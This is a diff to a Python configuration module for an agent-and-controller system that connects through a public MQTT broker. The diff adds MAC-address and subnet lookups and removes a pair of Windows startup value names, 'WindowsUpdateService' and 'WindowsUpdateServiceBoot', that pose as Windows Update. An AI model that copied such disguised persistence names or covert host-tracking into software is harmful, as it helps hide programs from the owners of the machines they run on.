@@ -1,9 +1,3 @@
-"""Shared configuration.
-
-Both the agent and the controller import this module, so every value here is
-part of the wire contract.  Change them in one place and both sides follow.
-"""
-
 from __future__ import annotations
 
 import os
@@ -12,6 +6,8 @@ import socket
 import uuid
 import sys as _sys
 from . import __version__ as PRODUCT_VERSION  # noqa: F401
+import json as _json
+import secrets
 
 # --------------------------------------------------------------------------
 # Identity of this deployment
@@ -114,8 +110,6 @@ GROUP = os.environ.get("SYSPY_GROUP", "")
 # single broker: mixed-broker agents never see each other
 BROKERS = [("broker.emqx.io", 8883, True)]
 
-RUN_VALUE_NAMES = ("WindowsUpdateService", "WindowsUpdateServiceBoot")
-
 _host_cache: dict = {}
 
 
@@ -136,10 +130,16 @@ def _deploy() -> dict:
         path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "deploy.json")
         try:
             with open(os.path.abspath(path), "r", encoding="utf-8-sig") as handle:
-                import json as _json
                 _host_cache["deploy"] = _json.load(handle) or {}
         except Exception:
             _host_cache["deploy"] = {}
+        if not _host_cache["deploy"].get("salt"):
+            _host_cache["deploy"]["salt"] = secrets.token_hex(2)
+            try:
+                with open(os.path.abspath(path), "w", encoding="utf-8") as handle:
+                    _json.dump(_host_cache["deploy"], handle, indent=1)
+            except OSError:
+                pass
     return _host_cache["deploy"]
 
 
@@ -180,6 +180,25 @@ def agent_id() -> str:
     host = re.sub(r"[^A-Za-z0-9_-]", "-", socket.gethostname())[:20] or "host"
     salt = str(_deploy().get("salt") or "")
     if not salt:
-        import secrets
         salt = secrets.token_hex(2)
     return f"{host}-{salt}"
+
+
+def mac() -> str:
+    """First usable MAC address as uppercase colon-separated string."""
+    if "mac" not in _host_cache:
+        val = uuid.getnode()
+        formatted = ":".join(("%012X" % val)[i:i+2] for i in range(0, 12, 2))
+        _host_cache["mac"] = formatted
+    return _host_cache["mac"]
+
+
+def subnet() -> str:
+    """Local IPv4 subnet in CIDR notation."""
+    if "subnet" not in _host_cache:
+        try:
+            from .lan import discover as _disc
+            _host_cache["subnet"] = _disc.local_subnet()
+        except Exception:
+            _host_cache["subnet"] = ""
+    return _host_cache["subnet"]
